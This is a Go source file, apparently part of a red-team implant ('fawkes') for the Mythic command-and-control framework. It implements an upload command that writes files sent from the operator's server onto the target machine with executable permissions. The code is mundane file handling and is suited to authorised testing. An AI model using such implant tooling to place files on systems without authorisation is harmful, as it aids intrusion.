package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// UploadCommand implements the upload command
type UploadCommand struct{}

// Name returns the command name
func (c *UploadCommand) Name() string {
	return "upload"
}

// Description returns the command description
func (c *UploadCommand) Description() string {
	return "Upload a file to the target system"
}

// UploadArgs represents the arguments for upload command
type UploadArgs struct {
	FileID     string `json:"file_id"`
	RemotePath string `json:"remote_path"`
	Overwrite  bool   `json:"overwrite"`
}

// Execute executes the upload command
func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
	args := UploadArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Handle tilde expansion
	fixedFilePath := args.RemotePath
	if strings.HasPrefix(fixedFilePath, "~/") {
		dirname, _ := os.UserHomeDir()
		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
	}
	fullPath, _ := filepath.Abs(fixedFilePath)

	// Set up the file transfer request
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = fullPath
	r.Task = &task
	r.SendUserStatusUpdates = true
	totalBytesWritten := 0

	// Check if file exists
	_, err = os.Stat(fullPath)
	fileExists := err == nil

	if fileExists && !args.Overwrite {
		return structs.CommandResult{
			Output:    fmt.Sprintf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath),
			Status:    "error",
			Completed: true,
		}
	}

	// Open file for writing — truncate if overwriting, create if new
	fp, err := os.OpenFile(fullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open %s for writing: %v", fullPath, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer fp.Close()

	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	var writeErr error
	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		_, writeErr = fp.Write(newBytes)
		if writeErr != nil {
			break
		}
		totalBytesWritten += len(newBytes)
	}
	if writeErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing to %s after %d bytes: %v", fullPath, totalBytesWritten, writeErr),
			Status:    "error",
			Completed: true,
		}
	}

	if task.DidStop() {
		return structs.CommandResult{
			Output:    "Task stopped early",
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath),
		Status:    "success",
		Completed: true,
	}
}
